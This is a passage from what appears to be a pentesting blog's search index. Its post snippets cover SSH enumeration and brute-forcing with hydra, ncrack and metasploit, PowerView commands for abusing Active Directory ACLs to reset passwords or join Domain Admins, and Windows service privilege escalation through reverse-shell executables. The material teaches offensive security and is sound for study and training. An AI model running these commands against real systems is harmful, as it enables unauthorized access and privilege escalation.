┌──(cyberkhalid㉿kali)-[~/pentest/data]└─$ lsdev.gitTransfering data to the compromised systemsyntax scp [path_local_file] [username]@[target_ip]:[path_to_destination]uploading tools.zip file to the target system┌──(cyberkhalid㉿kali)-[~/pentest/data]└─$ scp tool.zip user1@10.42.0.21:/home/user1/tool.zipuser1@10.42.0.21&#39;s password: tool.zip 100% 0 0.0KB/s 00:00 References https://attack.mitre.org/tactics/TA0010/ https://en.wikipedia.org/wiki/SSH_File_Transfer_Protocol https://en.wikipedia.org/wiki/Secure_copy_protocol" }, { "title": "SSH Pentesting -&gt; Enumeration", "url": "/posts/ssh-enum/", "categories": "Infrastructure Pentesting, SSH", "tags": "", "date": "2022-06-03 05:49:33 +0800", "snippet": "EnumerationEnumeration Is a technigue of discovering potential attack vectors in a target system.Technigues Port Scanning. Search Engines Authentication Methods. Supported Algorithms. Host KeysPort ScanningScannig ssh port using nmap┌──(cyberkhalid㉿kali)-[~/pentest/data]└─$ nmap -sT -sV -p 22 10.42.0.21Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-07 01:29 EDTNmap scan report for 10.42.0.21Host is up (0.00049s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 13.68 secondsAuthentication Methods.Authentication method is a method that is used to authenticate to an ssh server.There are two widely used methods of authentication for ssh: Password authentication (using user name and passwords) Public key-based authentication (using public and private key pairs)Enumerating authentication methods in use┌──(cyberkhalid㉿kali)-[~/pentest/data]└─$ nmap -sT --script ssh-auth-methods --script-args=&quot;ssh.user=root&quot; -p 22 10.42.0.21Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-07 01:31 EDTNmap scan report for 10.42.0.21Host is up (0.00050s latency).PORT STATE SERVICE22/tcp open ssh| ssh-auth-methods: | Supported authentication methods: | publickey|_ passwordNmap done: 1 IP address (1 host up) scanned in 13.57 secondsSearch Enigines Shodan CensysShodansyntax port:22Finding ssh server with shodanCensyssyntax services.port=22Finding ssh server with censysSupported AlgorithmsAlgorithms that are used for secure connections and authentications on an ssh server.Enumerating supported algorithms┌──(cyberkhalid㉿kali)-[~]└─$ nmap -sT -p 22 --script ssh2-enum-algos 10.42.0.21Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-07 01:31 EDTNmap scan report for 10.42.0.21Host is up (0.00050s latency).PORT STATE SERVICE22/tcp open ssh| ssh2-enum-algos: | kex_algorithms: (9)| curve25519-sha256| curve25519-sha256@libssh.org| ecdh-sha2-nistp256| ecdh-sha2-nistp384| ecdh-sha2-nistp521| diffie-hellman-group-exchange-sha256| diffie-hellman-group16-sha512| diffie-hellman-group18-sha512| diffie-hellman-group14-sha256| server_host_key_algorithms: (5)| rsa-sha2-512| rsa-sha2-256| ssh-rsa| ecdsa-sha2-nistp256| ssh-ed25519| encryption_algorithms: (6)| chacha20-poly1305@openssh.com| aes128-ctr| aes192-ctr| aes256-ctr| aes128-gcm@openssh.com| aes256-gcm@openssh.com| mac_algorithms: (10)| umac-64-etm@openssh.com| umac-128-etm@openssh.com| hmac-sha2-256-etm@openssh.com| hmac-sha2-512-etm@openssh.com| hmac-sha1-etm@openssh.com| umac-64@openssh.com| umac-128@openssh.com| hmac-sha2-256| hmac-sha2-512| hmac-sha1| compression_algorithms: (2)| none|_ zlib@openssh.comNmap done: 1 IP address (1 host up) scanned in 13.44 secondsHost KeysA host key is a cryptographic key used for authenticating computers in the SSH protocol.Host keys are key pairs, typically using the RSA, DSA, or ECDSA algorithms. Public host keys are stored on and/or distributed to SSH clients, and private keys are stored on SSH servers.Retrieving host keys of a target system┌──(cyberkhalid㉿kali)-[~/pentest/data]└─$ nmap -sT --script ssh-hostkey --script-args ssh_hostkey=full -p 22 10.42.0.21Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-07 01:41 EDTNmap scan report for 10.42.0.21Host is up (0.00040s latency).PORT STATE SERVICE22/tcp open ssh| ssh-hostkey: | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDiztvOFUYBRcNXYBnY2MznKrVtoGiDuctb8fKQhaM8BEOttoEckRvl3DDctXFIKt3hgkKv55zGoBvmDu7wta4pa/RvgM3K5Cv3mXhm85rGg68SnMa3TXHih/hlgUmbMu1v/aNxQjtk4ZmAt+Ae2PkZcpq7Ghzg8N/EBs4E6xHAzHQKN4hR+hPKOHeZBE8/+646kGPfITx4J5tsV7XonbymkHE8hfMIz2uaWjtqGQJ8sQogKGQAzTnbHv6sUsbWq0vr6vLHEGlRazXKVdV8BUQFc9uRZSVRHEfqJmVeR0QAJPOy8WVSzQcOwo4vLvWYcC5qB1M0pN2gddKcFYc7NONRtArJkDsNALIqkwqwIgfKffiz5CETJhKoUlHD88x3s8buXLRTdrGrBwC8oWfEsJjmf7CzWKWqRY8oJjQM4kx8i7Pg/9ItI1rYYDGd70VQYR4ebMi3Qu+3ALa1jn+44TMGlqXhhgAs0JXufuvWuGbUExu5MlZhGJZjHpQ4c2UDUaU=| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAHzNKoQbAwJIFErvQBZJiGR1aPOGRjTSbSaHwpN1Sax8w0cEOk9R8OGWGGFCS4LwxHabEY/mPEjHilcLaIFLSU=|_ ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBg1/hr+sJJQC5dKH4mfxwFAbKQGrNrX0efgEmvgeg6hNmap done: 1 IP address (1 host up) scanned in 13.61 secondsReferences https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh https://www.ssh.com/academy/ssh/host-key" }, { "title": "SSH Pentesting -&gt; Bruteforce", "url": "/posts/ssh-brute/", "categories": "Infrastructure Pentesting, SSH", "tags": "", "date": "2022-06-03 05:49:33 +0800", "snippet": "Bruteforce: mitre -&amp;gt; T1110Bruteforce Is a technigue that uses trial-and-error to guess login credentials.ToolsThese are some of the tools that are used to bruteforce ssh credentials. hydra ncrack metasploithydraHydra is a parallelized login cracker which supports numerous protocols to attack. It is very fast and flexible, and new modules are easy to add.Syntax hydra -L [userfile] -P [password_file] ssh://[target_ip]bruteforcing ssh protocol with hydra┌──(cyberkhalid㉿kali)-[~/pentest]└─$ hydra -L user.txt -P pass.txt ssh://192.168.43.234Hydra v9.3 (c) 2022 by van Hauser/THC &amp;amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-06-05 20:20:36[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4[DATA] max 16 tasks per 1 server, overall 16 tasks, 96 login tries (l:8/p:12), ~6 tries per task[DATA] attacking ssh://192.168.43.234:22/[22][ssh] host: 192.168.43.234 login: &#39;user1&#39; password: &#39;user1&#39;1 of 1 target successfully completed, 1 valid password found[WARNING] Writing restore file because 3 final worker threads did not complete until end.[ERROR] 3 targets did not resolve or could not be connected[ERROR] 0 target did not completeHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-06-05 20:20:59 NcrackNcrack Is a high-speed network authentication cracking tool. It was built to help companies secure their networks by proactively testing all their hosts and networking devices for poor passwords.syntax ncrack -U [userfile] -P [password_file] ssh://[target]bruteforcing ssh protocol with ncrack┌──(cyberkhalid㉿kali)-[~/pentest]└─$ ncrack -U user.txt -P pass.txt ssh://192.168.43.234Starting Ncrack 0.7 ( http://ncrack.org ) at 2022-06-05 20:29 EDTDiscovered credentials for ssh on 192.168.43.234 22/tcp:192.168.43.234 22/tcp ssh: &#39;user1&#39; &#39;user1&#39;Ncrack done: 1 service scanned in 21.01 seconds.MetasploitMetasploit Is an open source platform that supports vulnerability research, exploit development, and the creation of custom security tools.bruteforcing ssh protocol with metasploitmsf6 auxiliary(scanner/ssh/ssh_login) &amp;gt; optionsModule options (auxiliary/scanner/ssh/ssh_login): Name Current Setting Required Description ---- --------------- -------- ----------- BLANK_PASSWORDS false no Try blank passwords for all users BRUTEFORCE_SPEED 5 yes How fast to bruteforce, from 0 to 5 DB_ALL_CREDS false no Try each user/password couple stored in the current database DB_ALL_PASS false no Add all passwords in the current database to the list DB_ALL_USERS false no Add all users in the current database to the list DB_SKIP_EXISTING none no Skip existing credentials stored in the current database (Accepted: none, user, user&amp;amp;realm) PASSWORD no A specific password to authenticate with PASS_FILE no File containing passwords, one per line RHOSTS yes The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit RPORT 22 yes The target port STOP_ON_SUCCESS false yes Stop guessing when a credential works for a host THREADS 1 yes The number of concurrent threads (max one per host) USERNAME no A specific username to authenticate as USERPASS_FILE no File containing users and passwords separated by space, one pair per line USER_AS_PASS false no Try the username as the password for all users USER_FILE no File containing usernames, one per line VERBOSE false yes Whether to print output for all attemptsmsf6 auxiliary(scanner/ssh/ssh_login) &amp;gt; set rhosts 192.168.43.234rhost =&amp;gt; 192.168.43.234msf6 auxiliary(scanner/ssh/ssh_login) &amp;gt; set user_file /home/cyberkhalid/pentest/user.txtuser_file =&amp;gt; /home/cyberkhalid/pentest/user.txtmsf6 auxiliary(scanner/ssh/ssh_login) &amp;gt; set pass_file /home/cyberkhalid/pentest/pass.txtpass_file =&amp;gt; /home/cyberkhalid/pentest/pass.txtmsf6 auxiliary(scanner/ssh/ssh_login) &amp;gt; exploit[*] 192.168.43.234:22 - Starting bruteforce[+] 192.168.43.234:22 - Success: &#39;user1:user1&#39; &#39;uid=1000(user1) gid=1000(user1) groups=1000(user1),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),134(sambashare) Linux user1-VirtualBox 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux &#39;[*] SSH session 2 opened (192.168.43.1:41713 -&amp;gt; 192.168.43.234:22) at 2022-06-05 20:40:02 -0400[*] Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed Using private keysbruteforcing ssh protocol with metasploit using ssh-private keysmsf6 auxiliary(scanner/ssh/ssh_login_pubkey) &amp;gt; options Module options (auxiliary/scanner/ssh/ssh_login_pubkey): Name Current Setting Required Description ---- --------------- -------- ----------- BRUTEFORCE_SPEED 5 yes How fast to bruteforce, from 0 to 5 DB_ALL_USERS false no Add all users in the current database to the list KEY_PASS no Passphrase for SSH private key(s) KEY_PATH no Filename or directory of cleartext private keys. Filenames beginning with a dot, or ending in &quot;.pub&quot; wi ll be skipped. Duplicate private keys will be ignored. PRIVATE_KEY /home/cyberkhalid/pentest/id no The string value of the private key that will be used. If you are using MSFConsole, this value should b e set as file:PRIVATE_KEY_PATH. OpenSSH, RSA, DSA, and ECDSA private keys are supported. RHOSTS 192.168.43.234 yes The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit RPORT 22 yes The target port STOP_ON_SUCCESS false yes Stop guessing when a credential works for a host THREADS 1 yes The number of concurrent threads (max one per host) USERNAME user1 no A specific username to authenticate as USER_FILE no File containing usernames, one per line VERBOSE true yes Whether to print output for all attempts msf6 auxiliary(scanner/ssh/ssh_login_pubkey) &amp;gt; set key_path /home/cyberkhalid/pentest/id key_path =&amp;gt; /home/cyberkhalid/pentest/id msf6 auxiliary(scanner/ssh/ssh_login_pubkey) &amp;gt; set key_pass Passsword@123 key_pass =&amp;gt; Passsword@123 msf6 auxiliary(scanner/ssh/ssh_login_pubkey) &amp;gt; exploit [*] 192.168.43.234:22 SSH - Testing Cleartext Keys [*] 192.168.43.234:22 - Testing 1 key from /home/cyberkhalid/pentest/id [+] 192.168.43.234:22 - Success: &#39;user1:-----BEGIN RSA PRIVATE KEY----- Mitigations Enforce password policies. Set account lockout policies after a certain number of failed login attempts to prevent passwords from being guessed. Use multi-factor authentication.References https://attack.mitre.org/techniques/T1110/ https://www.kali.org/tools/hydra/ https://www.kali.org/tools/ncrack/ https://www.kali.org/tools/metasploit-framework/ https://attack.mitre.org/mitigations/M1027/ https://attack.mitre.org/mitigations/M1032/ https://attack.mitre.org/mitigations/M1036/" }, { "title": "WriteOwner On User", "url": "/posts/ad-writeowner-user/", "categories": "Infrastructure Pentesting, Active Directory", "tags": "", "date": "2022-06-03 05:49:33 +0800", "snippet": "WriteOwnerWriteOwner : Is a permission that allows you to change ownership of an object. If you have WriteOwner on user object, you can make yourself the owner of that user, and if you have ownership on user object, you can give yourself a right i.e Resetpassword that will allow you to reset user’s password, thereby escalating your privileges.EnumerationPowerViewWriteOwner EnumerationGet your current user’s sid by executing whoami /user, import powerview, then execute the below command to get the list of objects on which you have WriteOwner right.Commandget-objectacl -resolveguids | ? {($_.securityidentifier -eq &quot;[your_current_user_sid]&quot;) -and ($_.activedirectoryrights -like &quot;*WriteOwner*&quot;)}below image shows the current user usman has WriteOwner right on user object aliUser EnumerationExecute the below command to get more information about the target user.Commandget-netuser [target_user]below image shows the target user ali is a member of Domain AdminsBloodHoundYou can also get thesame result using bloodhound.below image shows the current user usman has WriteOwner right on user object ali who is a member of Domain AdminsExploitationPowerViewChange Ownership Of UserExecute the below command to give yourself ownership on the target user ali.Commandset-domainobjectowner -Identity [target_user] -OwnerIdentity [Your Current User]You can verify it using bloodhoundbelow image shows user usman is owner of user aliYou can verify it from server managerbelow image shows user usman is owner of user aliGive Resetpassword RightSince you are the owner of the user ali, you can execute the below command to give yourself Resetpassword right on the user.Commandadd-domainobjectacl -TargetIdentity [target_user] -PrincipalIdentity [Your Current User] -Rights ResetpasswordYou can verify it using the below command.Commandget-objectacl -resolveguids | ? {$_.securityidentifier -eq &quot;[your_current_user_sid]&quot;}Reset PasswordWith resetpassword right given, you can reset his password and login to his account by executing the below commandCommand$pass = ConvertTo-SecureString &#39;[Your New Password Here]&#39; -AsPlainText -Forceset-domainuserpassword -identity [target_user] -accountpassword $pass runas /user:[domain\\user] cmd.exeReferences https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2 https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse" }, { "title": "WriteDacl On User", "url": "/posts/ad-writedacl-user/", "categories": "Infrastructure Pentesting, Active Directory", "tags": "", "date": "2022-06-03 05:49:33 +0800", "snippet": "WriteDaclWriteDacl : Is a permission that allows you to modify object’s ACEs. If you have WriteDacl on user object, you can give yourself a right i.e Resetpassword that will allow you to reset user’s password, thereby escalating your privileges.EnumerationPowerViewWriteDacl EnumerationGet your current user’s sid by executing whoami /user, import powerview, then execute the below command to get the list of objects on which you have WriteDacl right.Commandget-objectacl -resolveguids | ? {($_.securityidentifier -eq &quot;[your_current_user_sid]&quot;) -and ($_.activedirectoryrights -like &quot;*WriteDacl*&quot;)}below image shows the current user usman has WriteDacl right on user object aliUser EnumerationExecute the below command to get more information about the target user.Commandget-netuser [target_user]below image shows the target user ali is a member of Domain AdminsBloodHoundYou can also get thesame result using bloodhound.below image shows the current user usman has WriteDacl right on user object ali who is a member of Domain AdminsExploitationPowerViewGive Resetpassword RightExecute the below command to give yourself Resetpassword right.Commandadd-domainobjectacl -TargetIdentity [target_user] -PrincipalIdentity [Your Current User] -Rights ResetpasswordYou can verify it using the below command.Commandget-objectacl -resolveguids | ? {$_.securityidentifier -eq &quot;[your_current_user_sid]&quot;}Reset PasswordWith resetpassword right given, you can reset his password and login to his account by executing the below commandCommand$pass = ConvertTo-SecureString &#39;[Your New Password Here]&#39; -AsPlainText -Forceset-domainuserpassword -identity [target_user] -accountpassword $pass runas /user:[domain\\user] cmd.exeReferences https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2 https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse" }, { "title": "Ownership On User", "url": "/posts/ad-owner-user/", "categories": "Infrastructure Pentesting, Active Directory", "tags": "", "date": "2022-06-03 05:49:33 +0800", "snippet": "OwnershipOwnership : If you have ownership on user object, you can give yourself a right i.e Resetpassword that will allow you to reset user’s password, thereby escalating your privileges.EnumerationBloodHoundOwnership Enumerationbelow image shows the current user usman is Owner of user aliExploitationPowerViewGive Resetpassword RightExecute the below command to give yourself Resetpassword right.Commandadd-domainobjectacl -TargetIdentity [target_user] -PrincipalIdentity [Your Current User] -Rights ResetpasswordYou can verify it using the below command.Commandget-objectacl -resolveguids | ? {$_.securityidentifier -eq &quot;[your_current_user_sid]&quot;}Reset PasswordWith resetpassword right given, you can reset his password and login to his account by executing the below commandCommand$pass = ConvertTo-SecureString &#39;[Your New Password Here]&#39; -AsPlainText -Forceset-domainuserpassword -identity [target_user] -accountpassword $pass runas /user:[domain\\user] cmd.exeReferences https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2 https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse" }, { "title": "GenericAll On User", "url": "/posts/ad-ga-user/", "categories": "Infrastructure Pentesting, Active Directory", "tags": "", "date": "2022-06-03 05:49:33 +0800", "snippet": "GenericAllGenericAll : Is a permission that gives full rights to an active directory objects. If you have GenericAll on user object, you can reset user’s password without knowing the current password of the user, thereby escalating your privileges.EnumerationPowerViewGenericAll EnumerationGet your current user’s sid by executing whoami /user, import powerview, then execute the below command to get the list of objects on which you have GenericAll right.Commandget-objectacl -resolveguids | ? {($_.securityidentifier -eq &quot;[your_current_user_sid]&quot;) -and ($_.activedirectoryrights -eq &quot;GenericAll&quot;)}below image shows the current user usman has GenericAll right on user object aliUser EnumerationExecute the below command to get more information about the target user.Commandget-netuser [target_user]below image shows the target user ali is a member of Domain AdminsBloodHoundYou can also get thesame result using bloodhound.below image shows the current user usman has GenericAll right on user object ali who is a member of Domain AdminsExploitationPowerViewSince you have GenericAll right on user ali, you can reset his password and login to his account by executing the below commandCommand$pass = ConvertTo-SecureString &#39;[Your New Password Here]&#39; -AsPlainText -Forceset-domainuserpassword -identity [target_user] -accountpassword $pass runas /user:[domain\\user] cmd.exeReferences https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2 https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse" }, { "title": "Force-Change-Password On User", "url": "/posts/ad-fcp-user/", "categories": "Infrastructure Pentesting, Active Directory", "tags": "", "date": "2022-06-03 05:49:33 +0800", "snippet": "Force-Change-PasswordForce-Change-Password : Is a permission that allows you to change user’s password. If you have Force-Change-Password on user object, you can reset user’s password without knowing the current password of the user, thereby escalating your privileges.EnumerationPowerViewForce-Change-Password EnumerationGet your current user’s sid by executing whoami /user, import powerview, then execute the below command to get the list of objects on which you have Force-Change-Password.Commandget-objectacl -resolveguids | ? {($_.securityidentifier -eq &quot;[your_current_user_sid]&quot;) -and ($_.objectacetype -eq &quot;User-Force-Change-Password&quot;)}below image shows the current user usman has Force-Change-Password. right on user object aliUser EnumerationExecute the below command to get more information about the target user.Commandget-netuser [target_user]below image shows the target user ali is a member of Domain AdminsBloodHoundYou can also get thesame result using bloodhound.below image shows the current user usman has GenericAll right on user object ali who is a member of Domain AdminsExploitationPowerViewReset PasswordSince you have Force-Change-Password right on user ali, you can reset his password and login to his account by executing the below commandCommand$pass = ConvertTo-SecureString &#39;[Your New Password Here]&#39; -AsPlainText -Forceset-domainuserpassword -identity [target_user] -accountpassword $pass runas /user:[domain\\user] cmd.exeReferences https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2 https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse" }, { "title": "WriteDacl On Group", "url": "/posts/aclgroupwritedacl/", "categories": "Infrastructure Pentesting, Active Directory", "tags": "", "date": "2022-06-03 05:49:33 +0800", "snippet": "WriteDaclWriteDacl : Is a permission that allows you to modify object’s ACEs. If you have WriteDacl on group object, you can give yourself a right i.e writemembers that will allow you to add users to a group.EnumerationPowerViewWriteDacl EnumerationWe will get current user’s sid by executing whoami /user, import powerview, then execute the below command to get the list of objects on which we have WriteDacl right.Commandget-objectacl -resolveguids | ? {($_.securityidentifier -eq &quot;[our_current_user_sid]&quot;) -and ($_.activedirectoryrights -like &quot;*WriteDacl*&quot;)}Below image shows the current user usman has WriteDacl right on Domain Admins group.BloodHoundWe can also get thesame result using bloodhound.Below image shows the current user usman has WriteDacl right on Domain Admins group.ExploitationLet’s check our current group.Here usman is a member of Domain Users group. We are going to exploit WriteDacl to add usman to Domain Admins group.PowerViewReferences https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2 https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse" }, { "title": "GenericWrite On Group", "url": "/posts/aclgroupgenwrite/", "categories": "Infrastructure Pentesting, Active Directory", "tags": "", "date": "2022-06-03 05:49:33 +0800", "snippet": "GenericWriteGenericWrite : If you have GenericWrite on group object, you can add users to the group.EnumerationPowerViewGenericWrite EnumerationWe will get current user’s sid by executing whoami /user, import powerview, then execute the below command to get the list of objects on which we have GenericWrite right.Commandget-objectacl -resolveguids | ? {($_.securityidentifier -eq &quot;[our_current_user_sid]&quot;) -and ($_.activedirectoryrights -like &quot;*GenericWrite*&quot;)}Below image shows the current user usman has GenericWrite right on Domain Admins group.BloodHoundWe can also get thesame result using bloodhound.Below image shows the current user usman has GenericWrite right on Domain Admins group.ExploitationLet’s check our current group.Here usman is a member of Domain Users group. We are going to exploit GenericWrite to add usman to Domain Admins group.PowerViewSince we have GenericWrite right on Domain Admins group, we can add usman to the group by executing the below commandCommandadd-domaingroupmember -identity &quot;Domain Admins&quot; -members usmanLet’s check it by executing get-netgroup -memberidentity usmanAs you can see, usman has been added to Domain Admins group.References https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2 https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse" }, { "title": "GenericAll On Group", "url": "/posts/aclgroupgenall/", "categories": "Infrastructure Pentesting, Active Directory", "tags": "", "date": "2022-06-03 05:49:33 +0800", "snippet": "GenericAllGenericAll : Is a permission that gives full rights to an active directory objects. If you have GenericAll on group object, you can add users to the group.EnumerationPowerViewGenericAll EnumerationWe will get current user’s sid by executing whoami /user, import powerview, then execute the below command to get the list of objects on which we have GenericAll right.Commandget-objectacl -resolveguids | ? {($_.securityidentifier -eq &quot;[our_current_user_sid]&quot;) -and ($_.activedirectoryrights -eq &quot;GenericAll&quot;)}Below image shows the current user usman has GenericAll right on Domain Admins group.BloodHoundWe can also get thesame result using bloodhound.Below image shows the current user usman has GenericAll right on Domain Admins group.ExploitationLet’s check our current group.Here usman is a member of Domain Users group. We are going to exploit GenericAll to add usman to Domain Admins group.PowerViewSince we have GenericAll right on Domain Admins group, we can add usman to the group by executing the below commandCommandadd-domaingroupmember -identity &quot;Domain Admins&quot; -members usmanLet’s check it by executing get-netgroup -memberidentity usmanAs you can see, usman has been added to Domain Admins group.References https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2 https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse" }, { "title": "Self-Membership", "url": "/posts/aclgroupaddself/", "categories": "Infrastructure Pentesting, Active Directory", "tags": "", "date": "2022-06-03 05:49:33 +0800", "snippet": "Self-MembershipSelf-Membership : Ability to add yourself to a group. If you have Self-Membership on group, you can add yourself to the group.EnumerationPowerViewSelf-Membership EnumerationWe will get current user’s sid by executing whoami /user, import powerview, then execute the below command to get the list of objects on which we have Self-Membership right.Commandget-objectacl -resolveguids | ? {($_.securityidentifier -eq &quot;[our_current_user_sid]&quot;) -and ($_.objectacetype -like &quot;*self-membership*&quot;)}Below image shows the current user usman has Self-Membership right on Domain Admins group.BloodHoundWe can also get thesame result using bloodhound.Below image shows the current user usman has Self-Membership right on Domain Admins group.ExploitationLet’s check our current group.Here usman is a member of Domain Users group. We are going to exploit Self-Membership to add usman to Domain Admins group.PowerViewSince we have Self-Membership right on Domain Admins group, we can add usman to the group by executing the below commandCommandadd-domaingroupmember -identity &quot;Domain Admins&quot; -members usmanLet’s check it by executing get-netgroup -memberidentity usmanAs you can see, usman has been added to Domain Admins group.References https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2 https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse" }, { "title": "Insecure Service-&gt; Unquoted Service Path", "url": "/posts/winprivsrvunq/", "categories": "Infrastructure Pentesting, Windows Privilege Escalations", "tags": "", "date": "2022-06-03 05:49:33 +0800", "snippet": "Insecure Service-&amp;gt; Unquoted Service PathExecutables in Windows can be run without using their extension (e.g. “whoami.exe” can be run by just typing “whoami”).Some executables take arguments, separated by spaces, e.g. someprog.exe arg1 arg2 arg3….This behavior leads to ambiguity when using absolute paths that are unquoted and contain spaces. The Windows must assume where to find the referenced application if the path contains spaces and is not enclosed by quotation marks. If, for example, a service uses the unquoted path:Vulnerable Service: C:\\Program Files\\Ignite Data\\Vuln Service\\file.exeThe system will read this path in the following sequence from 1 to 4 to trigger malicous.exe through a writeable directory. C:\\Program.exe C:\\Program Files\\Ignite.exe C:\\Program Files\\Ignite Data\\Vuln.exe C:\\Program Files\\Ignite Data\\Vuln Service\\file.exe If the path to the service binary is not enclosed in quotes and contains white spaces, and at thesame time we can stop/start the service , then we can achieve Privilege Escalation if the service runs with a SYSTEM privileges by simply placing our reverse shell executable in the writable path.EnumerationWe are going to exploit insecure service to escalate our privileges to SYSTEM. Let’s check our current user.Now, We will be using powerup.ps1 script to conduct an enumeration on the available services. Let’s import powerup.ps1 and execute Get-ServiceUnquoted to get the list of services that are vulnerable.As you can see, unquotedsvc is vulnerable to Unquoted Service Path, which means we can be able to abuse the path and place our reverse shell executable, which will be executed when the service starts.Let’s examine the path with Get-Acl to determine which directory we have write permission so that to place our reverse shell executable.Oh..It looks like we don’t have write permission on this directory. Let’s move to the next one.Great!…We have Full Control on this directory. We will place our reverse shell executable in this directory. But before that, let’s further examine the service to see whether or not the other conditions are satisfied…To be able to exploit a service and escalate our privileges, we need to: be able to start/stop the service have the service runs with higher privilegesWe are going to check the above conditions using accesschk.exe and sc.exe, if all the conditions are satisfied, we can achieve privilege escalation.Let’s execute accesschk /accepteula -cqv user unquotedsvc .Well…As you can see, we have permission to start/stop the service.We will execute sc qc unquotedsvc to check whether or not the service runs with SYSTEM privilege.Nice!! It runs with SYSTEM privilege. All conditions are satisfied, so we are going to exploit the service.ExploitationWe are going place our reverse shell executable in the writable path.Now, we will setup our reverse shell listener and start the service by executing net start unquotedsvc.Well…As you can see, we have obtained shell with SYSTEM privilege." }, { "title": "Insecure Service-&gt; Weak Registry Permissions", "url": "/posts/winprivsrvreg/", "categories": "Infrastructure Pentesting, Windows Privilege Escalations", "tags": "", "date": "2022-06-03 05:49:33 +0800", "snippet": "Insecure Service-&amp;gt; Weak Registry PermissionsIf the registry entries of a service is modifiable by our user, and at thesame time we can stop/start the service , then we can achieve Privilege Escalation if the service runs with a SYSTEM privileges by modify the service’s configuration in the registry.EnumerationWe are going to exploit insecure service to escalate our privileges to SYSTEM. Let’s check our current user.Now, Let’s execute Get-Services in powershell to get the list of available services.We will conduct an enumeration on regsvc service. We will use Get-Acl from powershell to check the registry’s acl of the service.As you can see, we have Full Control, which means we can be able to modify the registry entries of the service.Let’s query the entries using reg.exe.Well…here our target is ImagePath, we are going to change it to point to the path of our own reverse shell executable. But before that, let’s further examine the service to see whether or not the other conditions are satisfied…To be able to exploit a service and escalate our privileges, we need to: be able to start/stop the service have the service runs with higher privilegesWe are going to check the above conditions using accesschk.exe and sc.exe, if all the conditions are satisfied, we can achieve privilege escalation.Let’s execute accesschk /accepteula -cqv user regsvc .Well…As you can see, we have permission to start/stop the service.We will execute sc qc regsvc to check whether or not the service runs with SYSTEM privilege.Nice!! It runs with SYSTEM privilege. All conditions are satisfied, so we are going to exploit the service.ExploitationWe are going replace the imagepath of the service with the path of our own reverse shell executable.Now, we will setup our reverse shell listener and start the service by executing net start regsvc.Well…As you can see, we have obtained shell with SYSTEM privilege." }, { "title": "Insecure Service Permissions", "url": "/posts/winprivsrvperm/", "categories": "Infrastructure Pentesting, Windows Privilege Escalations", "tags": "", "date": "2022-06-03 05:49:33 +0800", "snippet": "Insecure Service PermissionsIf we can change the configuration of a service, and at thesame time we can stop/start the service , then we can achieve Privilege Escalation if the service runs with a SYSTEM privileges by modify the path of the executable i.e binpath to one of our own.EnumerationWe are going to exploit insecure service to escalate our privileges to SYSTEM. Let’s check our current user.Now, We will be using powerup.ps1 script to conduct an enumeration on the available services. Let’s import powerup.ps1 and execute Get-ServicePermission to get the list of services that have permission issues.As you can see, daclsvc is vulnerable to insecure service permission, which means we can be able to change the configuration of the service.To be able to exploit a service and escalate our privileges, we need to: be able to start/stop the service have the service runs with higher privilegesWe are going to check the above conditions using accesschk.exe and sc.exe, if all the conditions are satisfied, we can achieve privilege escalation.Let’s execute accesschk /accepteula -cqv user daclsvc .Well…As you can see, we have permission to start/stop the service.We will execute sc qc daclsvc to check whether or not the service runs with SYSTEM privilege.Nice!! It runs with SYSTEM privilege. All conditions are satisfied, so we are going to exploit the service.ExploitationWe are going to change the BINARY_PATH_NAME of the service to point to our own executable. To do that, we will execute sc config daclsvc binpath=&quot;C:\\path_to_our_executable&quot;.Now, we will setup our reverse shell listener and start the service by executing net start daclsvc.Well…As you can see, we have obtained shell with SYSTEM privilege." }, { "title": "Insecure Service Executables", "url": 